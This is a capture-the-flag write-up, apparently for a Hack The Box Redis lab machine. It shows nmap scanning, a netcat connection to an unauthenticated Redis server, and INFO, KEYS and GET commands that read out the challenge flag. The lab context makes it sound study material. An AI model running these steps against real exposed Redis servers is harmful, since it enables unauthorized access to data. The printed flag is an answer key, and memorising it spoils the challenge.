With the given IP address, we can start by scanning the machine to see which ports are open and which services are running.

```bash
user in ~ λ nmap -sV 10.129.54.67                        
Starting Nmap 7.80 ( https://nmap.org ) at 2024-01-31 20:19 -03
Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn
Nmap done: 1 IP address (0 hosts up) scanned in 3.25 seconds
user in ~ λ nmap -Pn 10.129.54.67
Starting Nmap 7.80 ( https://nmap.org ) at 2024-01-31 20:19 -03
Nmap scan report for 10.129.54.67 (10.129.54.67)
Host is up (0.20s latency).
All 1000 scanned ports on 10.129.54.67 (10.129.54.67) are closed

Nmap done: 1 IP address (1 host up) scanned in 13.83 seconds
```

It seems that the machine is blocking ping requests, so i'm going to cheat and scan the redis port directly since the machine has a tag of redis.

```bash
user in ~ λ nmap -p 6379 10.129.54.67   
Starting Nmap 7.80 ( https://nmap.org ) at 2024-01-31 00:22 -03
Nmap scan report for 10.129.54.67 (10.129.54.67)
Host is up (0.20s latency).

PORT     STATE SERVICE
6379/tcp open  redis

Nmap done: 1 IP address (1 host up) scanned in 0.42 seconds
user in ~ λ nmap -p 6379 10.129.54.67 --script redis-info
Starting Nmap 7.80 ( https://nmap.org ) at 2024-01-31 00:23 -03
Nmap scan report for 10.129.54.67 (10.129.54.67)
Host is up (0.20s latency).

PORT     STATE SERVICE
6379/tcp open  redis
| redis-info: 
|   Version: 5.0.7
|   Operating System: Linux 5.4.0-77-generic x86_64
|   Architecture: 64 bits
|   Process ID: 751
|   Used CPU (sys): 0.544089
|   Used CPU (user): 0.480078
|   Connected clients: 1
|   Connected slaves: 0
|   Used memory: 839.48K
|   Role: master
|   Bind addresses: 
|     0.0.0.0
|     ::1
|   Client connections: 
|_    10.10.14.39

Nmap done: 1 IP address (1 host up) scanned in 1.77 seconds
```

We can see that the machine is running a redis server, with this information we can try to connect to the server and see if we can get any information from it.

Here is a explanation of how to do it:

https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis

```bash
nc -vn <target> 6379
```

```bash
Connection to <target> 6379 port [tcp/*] succeeded!
```

Now inside we can try to get some information from the server.

```bash
INFO
```

OUTPUT:
```
# Stats
total_connections_received:5
total_commands_processed:4
instantaneous_ops_per_sec:0
total_net_input_bytes:253
total_net_output_bytes:20
instantaneous_input_kbps:0.00
instantaneous_output_kbps:0.00
rejected_connections:0
sync_full:0
sync_partial_ok:0
sync_partial_err:0
expired_keys:0
expired_stale_perc:0.00
expired_time_cap_reached_count:0
evicted_keys:0
keyspace_hits:0
keyspace_misses:0
pubsub_channels:0
pubsub_patterns:0
latest_fork_usec:0
migrate_cached_sockets:0
slave_expires_tracked_keys:0
active_defrag_hits:0
active_defrag_misses:0
active_defrag_key_hits:0
active_defrag_key_misses:0

# Replication
role:master
connected_slaves:0
master_replid:89c27ee8de877b97f8ff79fbfabdb061782d683d
master_replid2:0000000000000000000000000000000000000000
master_repl_offset:0
second_repl_offset:-1
repl_backlog_active:0
repl_backlog_size:1048576
repl_backlog_first_byte_offset:0
repl_backlog_histlen:0

# CPU
used_cpu_sys:0.036026
used_cpu_user:0.020586
used_cpu_sys_children:0.000000
used_cpu_user_children:0.000000

# Cluster
cluster_enabled:0

# Keyspace
db0:keys=4,expires=0,avg_ttl=0
```

We can see that the server has 4 keys, we can try to get the keys and see if we can get any information from them.

```bash
KEYS *
```

OUTPUT:
```
*4
$4
flag
$4
stor
$4
numb
$4
temp
```

There we can see the keys, we should try to obtain the value from the flag key.

```bash
GET flag
```

```
$32
03e1d2b376c37ab3f5319922053953eb
```

And there we have the flag.

https://www.hackthebox.com/achievement/machine/834305/472